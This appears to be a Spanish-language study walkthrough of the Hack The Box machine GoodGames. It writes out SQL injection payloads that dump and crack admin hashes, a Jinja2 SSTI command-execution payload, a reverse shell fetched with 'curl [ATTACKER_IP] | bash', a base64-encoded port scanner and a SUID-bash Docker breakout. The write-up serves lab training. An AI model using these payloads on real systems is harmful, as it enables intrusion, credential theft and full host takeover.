---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - SQLI
  - HashCracking
  - SSTI
  - ReverseShell
  - Mount
  - SSH
  - DockerBreakouts
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#HTTP|HTTP]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#SQLi|SQLi]]
	- [[#Exploitation#SQLi Database Enumeration|SQLi Database Enumeration]]
		- [[#SQLi Database Enumeration#Hash Cracking|Hash Cracking]]
	- [[#Exploitation#Server-Side Template Injection (SSTI)|Server-Side Template Injection (SSTI)]]
	- [[#Exploitation#Reverse Shell|Reverse Shell]]
- [[#Lateral Movement|Lateral Movement]]
	- [[#Lateral Movement#Shared Volume Discovery|Shared Volume Discovery]]
	- [[#Lateral Movement#Internal Network Enumeration|Internal Network Enumeration]]
	- [[#Lateral Movement#Internal Port Enumeration|Internal Port Enumeration]]
	- [[#Lateral Movement#SSH|SSH]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Docker Breakouts|Docker Breakouts]]

---
# GoodGames

![](Screenshots/Pasted%20image%2020260609170522.png)

>Máquina de Hack The Box llamada **[GoodGames](https://app.hackthebox.com/machines/GoodGames)**, centrada en la explotación de una aplicación web vulnerable desarrollada en Flask.  
>La intrusión comienza mediante una vulnerabilidad de **SQL Injection**, que permite obtener credenciales de administrador y acceder a un panel interno.  
>Posteriormente se explota una vulnerabilidad de **Server-Side Template Injection (SSTI)** para obtener ejecución remota de comandos dentro de un contenedor Docker.  
>Finalmente, se realiza movimiento lateral hacia el host principal reutilizando credenciales y se consigue acceso como `root` mediante un **Docker Breakout** basado en volúmenes compartidos.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.13.247
PING 10.129.13.247 (10.129.13.247) 56(84) bytes of data.
64 bytes from 10.129.13.247: icmp_seq=1 ttl=63 time=46.5 ms

--- 10.129.13.247 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.456/46.456/46.456/0.000 ms
```

El `TTL=63` indica que probablemente estamos ante un sistema Linux.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.13.247  -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

```PowerShell
nmap -p80 -sCV 10.129.13.247 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
```
### HTTP

```HTTP
http://10.129.13.247/
```

![](Screenshots/Pasted%20image%2020260609170957.png)

Se visualiza un panel de inicio de sesión.

![](Screenshots/Pasted%20image%2020260609175132.png)

Se crea un cuenta.

![](Screenshots/Pasted%20image%2020260609180536.png)

---
## Exploitation
### SQLi

Se prueba una inyección SQL clásica en el campo de usuario del formulario de autenticación.

La aplicación no filtra correctamente la entrada del usuario, permitiendo alterar la consulta SQL original y autenticarse como administrador.

Se intercepta con *Burp Suite*.

![](Screenshots/Pasted%20image%2020260609175818.png)

Esto sería con la cuenta que hemos creado anteriormente, pero si aplicamos un inyección **SQL**.

![](Screenshots/Pasted%20image%2020260609180050.png)

```HTTP
HTTP/1.1 200 OK
Date: Tue, 09 Jun 2026 16:00:36 GMT
Server: Werkzeug/2.0.2 Python/3.9.2
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Set-Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.aig4pA.L7eo7zncMRL9VHFbn1o8EBqTyMg; HttpOnly; Path=/
Content-Length: 9291
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```

Se observa que en la respuesta se asigna una `Cookie`.

![](Screenshots/Pasted%20image%2020260609180620.png)

```PowerShell
http://internal-administration.goodgames.htb/
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.13.247 goodgames.htb internal-administration.goodgames.htb`.
### SQLi Database Enumeration

![](Screenshots/Pasted%20image%2020260609180812.png)

Al no tener ninguna credencial, se piensa en poder sacar información de la **BBDD** mediante la vulnerabilidad explotada anteriormente.

![](Screenshots/Pasted%20image%2020260609181025.png)

![](Screenshots/Pasted%20image%2020260609181117.png)

![](Screenshots/Pasted%20image%2020260609181754.png)

![](Screenshots/Pasted%20image%2020260609181940.png)

![](Screenshots/Pasted%20image%2020260609182105.png)

![](Screenshots/Pasted%20image%2020260609182242.png)

![](Screenshots/Pasted%20image%2020260609182542.png)

![](Screenshots/Pasted%20image%2020260609182945.png)

```PowerShell
Input:' ORDER BY 200-- -
Output: -

Input:' ORDER BY 4-- -
Output: -

Input:' UNION SELECT 1,2,3,4-- -
Output: 4

Input:' UNION SELECT 1,2,3,database()-- -
Output: main

Input:' UNION SELECT 1,2,3,schema_name FROM information_schema.schemata-- -
Output: information_schema | main

Input:' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema='main'-- -
Output: blog,blog_comments,user

Input:' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_schema='main' AND table_name='user'-- -
Output: email,id,name,password

Input:' UNION SELECT 1,2,3,group_concat(name, ":", password) FROM main.user-- -
Output: admin:2b22337f218b2d82dfc3b6f77e7cb8ec,Prueba:5bc8c567a89112d5f408a8af4f17970d
```
#### Hash Cracking

El hash tiene formato MD5 y corresponde al usuario administrador de la aplicación.  
  
Al tratarse de un algoritmo débil y sin salt, puede recuperarse fácilmente mediante ataques de diccionario.

```PowerShell
hashid '2b22337f218b2d82dfc3b6f77e7cb8ec'
[+] MD2 
[+] MD5 
[+] MD4 

hashcat --example-hashes | grep MD5
  Name................: MD5
  Name................: HMAC-MD5 (key = $pass)
  Name................: HMAC-MD5 (key = $salt)
  Name................: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
  Name................: Apache $apr1$ MD5, md5apr1, MD5 (APR)
  Name................: Cisco-PIX MD5
  Name................: Cisco-ASA MD5
  Name................: iSCSI CHAP authentication, MD5(CHAP)
  Name................: Half MD5
  Name................: IKE-PSK MD5
  Name................: IPMI2 RAKP HMAC-MD5
  Name................: MS Office <= 2003 $0/$1, MD5 + RC4
  Name................: MS Office <= 2003 $0/$1, MD5 + RC4, collider #1
  Name................: MS Office <= 2003 $0/$1, MD5 + RC4, collider #2
  Name................: CRAM-MD5
  Name................: PostgreSQL CRAM (MD5)
  Name................: SIP digest authentication (MD5)
  Example.Hash........: $sip$*72087*1215344588738747***342210558720*737232616*1215344588738747*8867133055*65600****MD5*e9980869221f9d1182c83b0d5e56a7db
  Name................: PBKDF2-HMAC-MD5
  Name................: CRAM-MD5 Dovecot
  Example.Hash........: {CRAM-MD5}5389b33b9725e5657cb631dc50017ff100000000000000000000000000000000
  Name................: QNX /etc/shadow (MD5)
  Name................: MultiBit Classic .key (MD5)
  Name................: Dahua Authentication MD5
  Name................: Besder Authentication MD5
  Name................: SNMPv3 HMAC-MD5-96/HMAC-SHA1-96
  Name................: SNMPv3 HMAC-MD5-96
  Name................: ENCsecurity Datavault (MD5/no keychain)
  Name................: ENCsecurity Datavault (MD5/keychain)
  Name................: Python Werkzeug MD5 (HMAC-MD5 (key = $salt))
  Name................: NetIQ SSPR (MD5)
  
  hashcat --example-hashes | grep MD5 -B 15
  Hash Info:
==========

Hash mode #0
  Name................: MD5
--
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: 23a8a90599fc5d0d15265d4d3b565f6e:58802707
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Keep.Guessing.......: No
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
  
hashcat hash -m 0 /usr/share/wordlists/rockyou.txt
2b22337f218b2d82dfc3b6f77e7cb8ec:superadministrator 
```

Se obtiene las credenciales: `admin:superadministrator`.
### Server-Side Template Injection (SSTI)

Se inicia sesión.

![](Screenshots/Pasted%20image%2020260609184854.png)

Se observa en `Settings`, que puedes cambiar nombre, cumpleaños y número de teléfono.

![](Screenshots/Pasted%20image%2020260610090202.png)

Se prueba realizando: `{{7*7}}`.

![](Screenshots/Pasted%20image%2020260610090421.png)

La expresión devuelve `49`, confirmando que la entrada del usuario está siendo interpretada por el motor de plantillas Jinja2.  
  
Esto indica la presencia de una vulnerabilidad Server-Side Template Injection (SSTI), que puede aprovecharse para ejecutar comandos arbitrarios en el servidor.

```PowerShell
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

![](Screenshots/Pasted%20image%2020260610091301.png)
### Reverse Shell

Lo primero que tenemos que hacer es ver si la máquina victima tiene conectividad.

Máquina atacante:

```PowerShell
tcpdump -i tun0 icmp -n
```

Máquina victima:

```PowerShell
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ping -c 1 [ATTACKER_IP]').read() }}
```

Se recibe correctamente la traza.

Se realiza una *Reverse Shell*.

Máquina atacante:

```PowerShell
vim index.html
cat index.html
#!/bin/bash

bash -i >& /dev/tcp/[ATTACKER_IP]/1234 0>&1

python3 -m http.server 80
nc -nlvp 1234
```

Máquina atacante:

```PowerShell
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl [ATTACKER_IP] | bash').read() }}
```

Se obtiene una consola interactiva con `root` (huele a contenedor).

Se realiza un tratamiento de la terminal.

```powershell
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 59 columns 236
```

Se verifica si estamos en un contenedor.

```PowerShell
hostname -I
172.19.0.2

ls -la /
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 .
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Jun 10 06:57 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 12  2018 media
drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
dr-xr-xr-x 177 root root    0 Jun 10 06:57 proc
drwx------   1 root root 4096 Nov  5  2021 root
drwxr-xr-x   3 root root 4096 Nov 12  2018 run
drwxr-xr-x   1 root root 4096 Nov  5  2021 sbin
drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
dr-xr-xr-x  13 root root    0 Jun 10 06:57 sys
drwxrwxrwt   1 root root 4096 Nov  5  2021 tmp
drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
drwxr-xr-x   1 root root 4096 Nov 12  2018 var
```

Nos encontramos en un contenedor de `Docker`.

La flag de `usuario` se encuentra en `/home/augustus`.

---
## Lateral Movement
### Shared Volume Discovery

Se visualiza el archivo: `/etc/passwd`.

```PowerShell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

No se ve, el usuario: `augustus`.

```PowerShell
ls -l /home/augustus
-rw-r----- 1 root 1000 33 Jun 10 06:57 user.txt

mount | grep home
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

Es una montura de la máquina "real".
### Internal Network Enumeration

```PowerShell
ping -c 1 172.19.0.1
PING 172.19.0.1 (172.19.0.1) 56(84) bytes of data.
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.080 ms

--- 172.19.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.080/0.080/0.080/0.000 ms
```
### Internal Port Enumeration

Dado que nos encontramos dentro de un contenedor Docker, se realiza una enumeración de la red interna para identificar servicios accesibles únicamente desde el entorno local.

Máquina atacante:

```PowerShell
vim portDiscovery.sh
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo ...\n"
        tput cnorm; exit 1
}

# Ctrl - C
trap ctrl_c INT

tput civis

declare -a hosts=(172.19.0.1)

for host in ${hosts[@]}; do
        echo -e "\n[+] Enumerate the host: $host\n"
        for port in $(seq 1 10000); do
                timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t[+] Port: $port - OPEN" &
        done; wait
done

tput cnorm

cat portDiscovery.sh | base64 -w 0; echo
IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgICAgIGVjaG8gLWUgIlxuXG5bIV0gU2FsaWVuZG8gLi4uXG4iCiAgICAgICAgdHB1dCBjbm9ybTsgZXhpdCAxCn0KCiMgQ3RybCAtIEMKdHJhcCBjdHJsX2MgSU5UCgp0cHV0IGNpdmlzCgpkZWNsYXJlIC1hIGhvc3RzPSgxNzIuMTkuMC4xKQoKZm9yIGhvc3QgaW4gJHtob3N0c1tAXX07IGRvCiAgICAgICAgZWNobyAtZSAiXG5bK10gRW51bWVyYXRlIHRoZSBob3N0OiAkaG9zdFxuIgogICAgICAgIGZvciBwb3J0IGluICQoc2VxIDEgMTAwMDApOyBkbwogICAgICAgICAgICAgICAgdGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8kaG9zdC8kcG9ydCIgMj4vZGV2L251bGwgJiYgZWNobyAtZSAiXHRbK10gUG9ydDogJHBvcnQgLSBPUEVOIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCgp0cHV0IGNub3JtCg==
```

Máquina victima:

```PowerShell
echo IyEvYmluL2Jhc2gKCmZ1bmN0aW9uIGN0cmxfYygpewogICAgICAgIGVjaG8gLWUgIlxuXG5bIV0gU2FsaWVuZG8gLi4uXG4iCiAgICAgICAgdHB1dCBjbm9ybTsgZXhpdCAxCn0KCiMgQ3RybCAtIEMKdHJhcCBjdHJsX2MgSU5UCgp0cHV0IGNpdmlzCgpkZWNsYXJlIC1hIGhvc3RzPSgxNzIuMTkuMC4xKQoKZm9yIGhvc3QgaW4gJHtob3N0c1tAXX07IGRvCiAgICAgICAgZWNobyAtZSAiXG5bK10gRW51bWVyYXRlIHRoZSBob3N0OiAkaG9zdFxuIgogICAgICAgIGZvciBwb3J0IGluICQoc2VxIDEgMTAwMDApOyBkbwogICAgICAgICAgICAgICAgdGltZW91dCAxIGJhc2ggLWMgImVjaG8gJycgPiAvZGV2L3RjcC8kaG9zdC8kcG9ydCIgMj4vZGV2L251bGwgJiYgZWNobyAtZSAiXHRbK10gUG9ydDogJHBvcnQgLSBPUEVOIiAmCiAgICAgICAgZG9uZTsgd2FpdApkb25lCgp0cHV0IGNub3JtCg== | base64 -d > portDiscovery.sh
chmod +x portDiscovery.sh
./portDiscovery.sh 

[+] Enumerate the host: 172.19.0.1

        [+] Port: 22 - OPEN
        [+] Port: 80 - OPEN
```

El puerto `22 - SSH`, se encuentra abierto.
### SSH

Se reutilizan las credenciales: `augustus:superadministrator`.

```PowerShell
ssh augustus@172.19.0.1
```

Se obtiene una consola interactiva con `Augustus`.

```PowerShell
hostname -I
10.129.13.247 172.17.0.1 172.19.0.1 dead:beef::a0de:adff:fea3:9a23
```

Nos encontramos en la máquina "real".

---
## Privilege Escalation
### Docker Breakouts

El directorio `/home/augustus` se encuentra montado tanto en el contenedor como en el host principal.

Esto permite modificar archivos desde el contenedor y reflejar los cambios directamente en el sistema anfitrión.

Aprovechando que disponemos de privilegios root dentro del contenedor, se crea una copia de `bash`, se asigna como propietario root y se establece el bit SUID.

Cuando el binario es ejecutado desde el host, hereda privilegios elevados y proporciona una shell como root.

```PowerShell
cd /home/augustus
cp /bin/bash .
ls -l
-rwxr-xr-x 1 augustus augustus 1234376 Jun 10 08:59 bash
-rw-r----- 1 root     augustus      33 Jun 10 07:57 user.txt

# Vuelvo al contenedor, donde soy root
exit
cd /home/augustus
ls -l
-rwxr-xr-x 1 1000 1000 1234376 Jun 10 07:59 bash
-rw-r----- 1 root 1000      33 Jun 10 06:57 user.txt

chown root:root bash
ls -l
-rwxr-xr-x 1 root root 1234376 Jun 10 07:59 bash
-rw-r----- 1 root 1000      33 Jun 10 06:57 user.txt

chmod 4755 bash
ls -l
-rwsr-xr-x 1 root root 1234376 Jun 10 07:59 bash
-rw-r----- 1 root 1000      33 Jun 10 06:57 user.txt

# Vuelvo a conectarme con ssh
ssh augustus@172.19.0.1
ls -l
-rwsr-xr-x 1 root root     1234376 Jun 10 08:59 bash
-rw-r----- 1 root augustus      33 Jun 10 07:57 user.txt

./bash -p
whoami
root
```

La flag de `root` se encuentra en `/root/`.

---